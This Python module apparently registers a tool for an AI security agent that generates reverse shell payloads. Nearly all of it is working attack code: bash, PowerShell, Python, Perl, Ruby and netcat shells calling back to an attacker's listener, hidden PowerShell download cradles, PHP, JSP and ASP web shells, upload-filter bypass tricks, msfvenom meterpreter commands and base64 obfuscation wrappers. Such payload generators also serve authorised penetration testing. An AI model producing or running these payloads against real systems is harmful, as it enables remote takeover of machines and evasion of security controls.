"""Generate reverse shell payloads for various languages and platforms."""

from __future__ import annotations

import base64
import urllib.parse
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


ReverseShellAction = Literal[
    "generate_bash",
    "generate_powershell",
    "generate_python",
    "generate_php",
    "generate_perl",
    "generate_ruby",
    "generate_nc",
    "generate_all",
    "generate_web_shell",
    "generate_msfvenom",
]


def _encode_payload(payload: str, encoding: str) -> str:
    """Encode payload with specified encoding."""
    if encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "url":
        return urllib.parse.quote(payload)
    return payload


def _generate_bash(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate Bash reverse shell payloads."""
    payloads = {
        "bash_tcp": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_tcp_alt": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "bash_udp": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "sh_exec": f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        "bash_read": f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
    }

    if encoding != "none":
        payloads = {k: _encode_payload(v, encoding) for k, v in payloads.items()}
        if encoding == "base64":
            payloads = {k: f"echo {v} | base64 -d | bash" for k, v in payloads.items()}

    return {
        "action": "generate_bash",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
    }


def _generate_powershell(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate PowerShell reverse shell payloads."""
    # Basic PowerShell reverse shell
    ps_payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''

    # Shorter version
    ps_short = f'''$c=New-Object Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}};$c.Close()'''

    # Conpty shell for full TTY
    ps_conpty = f'''IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {lhost} {lport}'''

    payloads = {
        "powershell_tcp": ps_payload,
        "powershell_short": ps_short,
        "powershell_conpty": ps_conpty,
    }

    # Create encoded versions
    encoded_payloads = {}
    for name, payload in payloads.items():
        if encoding == "base64":
            # PowerShell uses UTF-16LE for -EncodedCommand
            b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
            encoded_payloads[f"{name}_encoded"] = f"powershell -e {b64}"
        elif encoding == "url":
            encoded_payloads[f"{name}_url"] = urllib.parse.quote(payload)
        else:
            encoded_payloads[name] = payload

    return {
        "action": "generate_powershell",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": encoded_payloads,
        "one_liners": {
            "download_cradle": f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/shell.ps1')\"",
            "hidden_exec": f"powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/shell.ps1')\"",
        },
        "listener": f"nc -lvnp {lport}",
    }


def _generate_python(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate Python reverse shell payloads."""
    # Python 3
    py3_payload = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''

    # Python 2
    py2_payload = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\''''

    # PTY shell (full TTY)
    pty_payload = f'''python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''''

    # Windows Python
    win_py = f'''python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"'''

    payloads = {
        "python3": py3_payload,
        "python2": py2_payload,
        "python_pty": pty_payload,
        "python_windows": win_py,
    }

    if encoding == "base64":
        for name, payload in list(payloads.items()):
            b64 = base64.b64encode(payload.encode()).decode()
            payloads[f"{name}_b64"] = f"echo {b64} | base64 -d | bash"

    return {
        "action": "generate_python",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
        "upgrade_tty": [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "Ctrl+Z",
            "stty raw -echo; fg",
            "export TERM=xterm",
        ],
    }


def _generate_php(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate PHP reverse shell payloads."""
    php_exec = f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"

    php_system = f"<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"

    php_passthru = f"<?php passthru(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"

    php_shell_exec = f"<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"

    # Pentestmonkey PHP reverse shell one-liner
    php_socket = f'''<?php $sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3"); ?>'''

    # Full PHP reverse shell
    php_full = f'''<?php
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>'''

    payloads = {
        "php_exec": php_exec,
        "php_system": php_system,
        "php_passthru": php_passthru,
        "php_shell_exec": php_shell_exec,
        "php_socket": php_socket,
        "php_full": php_full,
    }

    if encoding == "base64":
        for name, payload in list(payloads.items()):
            b64 = base64.b64encode(payload.encode()).decode()
            payloads[f"{name}_b64"] = f"<?php eval(base64_decode('{b64}')); ?>"

    return {
        "action": "generate_php",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
        "web_shell_ref": "https://github.com/pentestmonkey/php-reverse-shell",
    }


def _generate_perl(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate Perl reverse shell payloads."""
    perl_payload = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''''

    perl_nosh = f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>\''''

    payloads = {
        "perl_socket": perl_payload,
        "perl_io": perl_nosh,
    }

    return {
        "action": "generate_perl",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
    }


def _generate_ruby(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate Ruby reverse shell payloads."""
    ruby_payload = f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''''

    ruby_nosh = f'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''''

    payloads = {
        "ruby_exec": ruby_payload,
        "ruby_fork": ruby_nosh,
    }

    return {
        "action": "generate_ruby",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
    }


def _generate_nc(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate Netcat reverse shell payloads."""
    payloads = {
        "nc_e": f"nc -e /bin/sh {lhost} {lport}",
        "nc_e_bash": f"nc -e /bin/bash {lhost} {lport}",
        "nc_c": f"nc -c /bin/sh {lhost} {lport}",
        "ncat_e": f"ncat {lhost} {lport} -e /bin/bash",
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "nc_mknod": f"rm -f /tmp/p; mknod /tmp/p p && nc {lhost} {lport} 0</tmp/p | /bin/sh 1>/tmp/p",
        "busybox_nc": f"busybox nc {lhost} {lport} -e /bin/sh",
    }

    return {
        "action": "generate_nc",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "payloads": payloads,
        "listener": f"nc -lvnp {lport}",
        "note": "nc -e may not be available on all systems; mkfifo version is more portable",
    }


def _generate_all(lhost: str, lport: int, encoding: str = "none") -> dict[str, Any]:
    """Generate all types of reverse shells."""
    result = {
        "action": "generate_all",
        "lhost": lhost,
        "lport": lport,
        "encoding": encoding,
        "bash": _generate_bash(lhost, lport, encoding),
        "powershell": _generate_powershell(lhost, lport, encoding),
        "python": _generate_python(lhost, lport, encoding),
        "php": _generate_php(lhost, lport, encoding),
        "perl": _generate_perl(lhost, lport, encoding),
        "ruby": _generate_ruby(lhost, lport, encoding),
        "netcat": _generate_nc(lhost, lport, encoding),
        "listener": f"nc -lvnp {lport}",
        "rlwrap_listener": f"rlwrap nc -lvnp {lport}",
    }

    return result


def _generate_web_shell(lhost: str, lport: int) -> dict[str, Any]:
    """Generate web shell payloads."""
    result = {
        "action": "generate_web_shell",
        "lhost": lhost,
        "lport": lport,
        "shells": {
            "php_simple": '<?php system($_GET["cmd"]); ?>',
            "php_post": '<?php system($_POST["cmd"]); ?>',
            "php_passthru": '<?php passthru($_REQUEST["cmd"]); ?>',
            "php_eval": '<?php eval($_REQUEST["code"]); ?>',
            "php_hidden": '<?=`$_GET[0]`?>',
            "php_assert": '<?php @assert($_REQUEST["cmd"]); ?>',
            "jsp_simple": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            "asp_simple": '<%eval request("cmd")%>',
            "aspx_simple": '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>',
        },
        "usage": {
            "php": "curl http://target/shell.php?cmd=id",
            "post": "curl -X POST -d 'cmd=id' http://target/shell.php",
        },
        "bypass_techniques": [
            "Use .phtml, .phar, .php5 extensions",
            "Use double extension: shell.php.jpg",
            "Add GIF89a header for image bypass",
            "Use .htaccess to enable PHP in other extensions",
        ],
    }

    return result


def _generate_msfvenom(lhost: str, lport: int) -> dict[str, Any]:
    """Generate msfvenom commands for various payloads."""
    result = {
        "action": "generate_msfvenom",
        "lhost": lhost,
        "lport": lport,
        "commands": {
            "linux_x64_staged": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf",
            "linux_x64_stageless": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf",
            "linux_x86_staged": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf",
            "windows_x64_staged": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
            "windows_x64_stageless": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
            "windows_x86_staged": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
            "php_meterpreter": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.php",
            "python_meterpreter": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.py",
            "asp_meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f asp > shell.asp",
            "aspx_meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx > shell.aspx",
            "jsp_meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.jsp",
            "war_meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war",
            "msi_meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f msi > shell.msi",
            "dll_meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll > shell.dll",
            "powershell_base64": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f psh -o shell.ps1",
        },
        "encoding_options": {
            "shikata_ga_nai": "-e x86/shikata_ga_nai -i 5",
            "avoid_bad_chars": "-b '\\x00\\x0a\\x0d'",
        },
        "handlers": {
            "setup": f"""msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\"""",
        },
    }

    return result


@register_tool
def reverse_shell_generator(
    action: ReverseShellAction,
    lhost: str | None = None,
    lport: int | None = None,
    encoding: str = "none",
    shell_type: str = "reverse",
    **kwargs: Any,
) -> dict[str, Any] | str:
    """Generate reverse shell payloads for various languages and platforms.

    Args:
        action: The generation action to perform:
            - generate_bash: Generate Bash reverse shell
            - generate_powershell: Generate PowerShell reverse shell
            - generate_python: Generate Python reverse shell
            - generate_php: Generate PHP reverse shell
            - generate_perl: Generate Perl reverse shell
            - generate_ruby: Generate Ruby reverse shell
            - generate_nc: Generate Netcat reverse shell
            - generate_all: Generate all reverse shell types
            - generate_web_shell: Generate web shells
            - generate_msfvenom: Generate msfvenom commands
        lhost: Listener IP address (attacker's IP)
        lport: Listener port number
        encoding: Encoding type: base64, url, none (default: none)
        shell_type: Shell type: reverse (default), bind

    Returns:
        Generated payloads with listener commands
    """
    VALID_PARAMS = {"action", "lhost", "lport", "encoding", "shell_type"}
    VALID_ACTIONS = [
        "generate_bash", "generate_powershell", "generate_python", "generate_php",
        "generate_perl", "generate_ruby", "generate_nc", "generate_all",
        "generate_web_shell", "generate_msfvenom"
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "reverse_shell_generator"):
        unknown_error.update(
            generate_usage_hint("reverse_shell_generator", "generate_bash", {"lhost": "10.10.14.1", "lport": 4444})
        )
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "reverse_shell_generator"):
        action_error["usage_examples"] = {
            "generate_bash": 'reverse_shell_generator(action="generate_bash", lhost="10.10.14.1", lport=4444)',
            "generate_all": 'reverse_shell_generator(action="generate_all", lhost="10.10.14.1", lport=9001)',
            "generate_msfvenom": 'reverse_shell_generator(action="generate_msfvenom", lhost="192.168.1.100", lport=443)',
        }
        return action_error

    # Validate required params
    if param_error := validate_required_param(lhost, "lhost", action, "reverse_shell_generator"):
        return param_error

    if param_error := validate_required_param(lport, "lport", action, "reverse_shell_generator"):
        return param_error

    # Validate encoding
    if encoding not in ["none", "base64", "url"]:
        return {
            "error": f"Invalid encoding: {encoding}",
            "hint": "Use 'none', 'base64', or 'url'",
            "tool_name": "reverse_shell_generator",
        }

    action_map = {
        "generate_bash": lambda: _generate_bash(lhost, lport, encoding),
        "generate_powershell": lambda: _generate_powershell(lhost, lport, encoding),
        "generate_python": lambda: _generate_python(lhost, lport, encoding),
        "generate_php": lambda: _generate_php(lhost, lport, encoding),
        "generate_perl": lambda: _generate_perl(lhost, lport, encoding),
        "generate_ruby": lambda: _generate_ruby(lhost, lport, encoding),
        "generate_nc": lambda: _generate_nc(lhost, lport, encoding),
        "generate_all": lambda: _generate_all(lhost, lport, encoding),
        "generate_web_shell": lambda: _generate_web_shell(lhost, lport),
        "generate_msfvenom": lambda: _generate_msfvenom(lhost, lport),
    }

    if action in action_map:
        return action_map[action]()

    return {"error": "Unknown action", "tool_name": "reverse_shell_generator"}
